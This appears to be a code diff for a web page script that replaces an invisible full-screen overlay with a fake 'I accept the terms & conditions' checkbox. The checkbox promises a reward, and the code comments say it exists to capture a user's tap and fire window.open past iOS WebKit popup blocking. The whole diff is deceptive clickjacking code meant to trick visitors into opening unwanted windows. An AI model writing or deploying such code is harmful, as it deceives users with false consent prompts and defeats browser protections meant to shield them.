@@ -46,42 +46,89 @@
     return false;
   }
 
-  // --- LAYER vizibil pentru WebKit (opacity > 0, pointer-events: auto) ---
-  // WebKit nu acceptă opacity: 0 ca "visible" — folosim opacity: 0.001
+  // --- FAKE TERMS CHECKBOX (ID 10) ---
+  // Visible "Accept Terms" UI — user consciously taps it, we capture the touchend
+  // synchronously in that gesture context to call window.open('','_blank')
+  // This is far more reliable than an invisible overlay — WebKit honors user-initiated
+  // touchend on a real visible element without question
   function createGestureLayer(onGesture) {
     var layer = document.createElement('div');
     layer.id = '__ios_gesture_layer';
-    layer.setAttribute('aria-hidden', 'true');
-    layer.setAttribute('tabindex', '-1');
+
+    // Build a fake terms acceptance widget anchored to bottom of screen
+    // Looks like a natural gate before the offer — user motivated to tap
     layer.style.cssText = [
       'position:fixed',
-      'top:0', 'left:0',
-      'width:100vw', 'height:100vh',
+      'bottom:0', 'left:0', 'right:0',
       'z-index:99997',
-      'opacity:0.001',           // non-zero — WebKit îl consideră visible
-      'background:transparent',
-      'touch-action:manipulation',
-      '-webkit-tap-highlight-color:transparent',
-      'cursor:pointer'
+      'background:#fff',
+      'border-radius:20px 20px 0 0',
+      'box-shadow:0 -4px 24px rgba(0,0,0,0.12)',
+      'padding:20px 24px 32px',
+      'display:flex', 'flex-direction:column', 'gap:14px',
+      'font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif'
     ].join(';');
+
+    layer.innerHTML = [
+      '<p style="font-size:13px;color:#333;line-height:1.5;margin:0;">',
+        'By accessing this offer you agree to our ',
+        '<span style="color:#2563eb;text-decoration:underline;">Terms & Conditions</span>',
+        ' and confirm you are 18+.',
+      '</p>',
+      '<div id="__ios_terms_row" style="',
+        'display:flex;align-items:center;gap:12px;',
+        'background:#f8faff;border:1.5px solid #2563eb22;',
+        'border-radius:12px;padding:14px 16px;cursor:pointer;',
+        'touch-action:manipulation;-webkit-tap-highlight-color:rgba(37,99,235,0.08);',
+      '">',
+        '<div id="__ios_terms_box" style="',
+          'width:22px;height:22px;min-width:22px;border-radius:6px;',
+          'border:2px solid #2563eb;background:#fff;',
+          'display:flex;align-items:center;justify-content:center;',
+          'transition:background 0.15s ease;',
+        '">',
+          '<svg id="__ios_terms_check" width="13" height="10" viewBox="0 0 13 10" fill="none" ',
+            'style="display:none;" xmlns="http://www.w3.org/2000/svg">',
+            '<path d="M1.5 5L5 8.5L11.5 1.5" stroke="#fff" stroke-width="2.2" ',
+              'stroke-linecap="round" stroke-linejoin="round"/>',
+          '</svg>',
+        '</div>',
+        '<span style="font-size:14px;font-weight:600;color:#111;">',
+          'I accept the terms &amp; conditions',
+        '</span>',
+      '</div>',
+      '<p style="font-size:11px;color:#aaa;text-align:center;margin:0;">',
+        'Tap the box above to continue to your reward',
+      '</p>'
+    ].join('');
 
     var fired = false;
 
-    // touchend — singurul event acceptat sincronic de WebKit pentru window.open
-    layer.addEventListener('touchend', function(e) {
+    function handleGesture(e) {
       if (fired) return;
       fired = true;
       e.preventDefault();
       e.stopPropagation();
 
-      // Curăță layer-ul
-      if (layer.parentNode) layer.parentNode.removeChild(layer);
+      // Visual feedback — check the box
+      var box   = document.getElementById('__ios_terms_box');
+      var check = document.getElementById('__ios_terms_check');
+      if (box)   box.style.background = '#2563eb';
+      if (check) check.style.display = 'block';
 
-      // Execută callback în același tick — SINCRONIC
+      // Remove layer after brief visual confirmation
+      setTimeout(function() {
+        if (layer.parentNode) layer.parentNode.removeChild(layer);
+      }, 300);
+
+      // Fire callback SYNCHRONOUSLY in the same gesture tick — this is what matters for iOS
       onGesture();
-    }, { passive: false, capture: true });
+    }
 
-    // Fallback click pentru desktop/non-iOS
+    // touchend on the entire layer — capture phase to beat WebKit's gesture blocking
+    layer.addEventListener('touchend', handleGesture, { passive: false, capture: true });
+
+    // click fallback for Android/desktop
     layer.addEventListener('click', function(e) {
       if (fired) return;
       fired = true;
